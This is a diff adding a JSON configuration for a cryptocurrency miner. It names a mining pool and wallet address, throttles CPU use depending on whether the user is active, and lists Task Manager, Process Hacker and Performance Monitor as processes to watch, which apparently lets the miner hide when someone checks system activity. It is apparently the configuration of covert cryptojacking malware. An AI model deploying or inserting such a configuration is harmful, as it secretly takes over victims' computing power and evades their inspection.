@@ -1,0 +1,27 @@
+{
+    "enable_cpu": 1,
+    "enable_gpu": 0,
+    "cpu_config": {
+        "mining_url": "pool.hashvault.pro:443",
+        "wallet": "83Z3CtEhU1LWKkwZUoKE3sH7mRZX2tfMxKfgncMzNqY81eCFACMgfqE5dPoodVXBpSYK7UYNx8NSkEfwwap9GXtRV1ZRyMG",
+        "password": "3010",
+        "non_idle_usage": 30,
+        "idle_usage": 80,
+        "wait_time_idle": 2,
+        "use_ssl": 1
+    },
+    "gpu_config": {
+        "mining_url": "",
+        "wallet": "",
+        "password": "",
+        "algo": "kawpow",
+        "fan_speed": 80,
+        "wait_time_idle": 300,
+        "use_ssl": 0
+    },
+    "watched_processes": [
+        "taskmgr.exe",
+        "processhacker.exe",
+        "perfmon.exe"
+    ]
+}
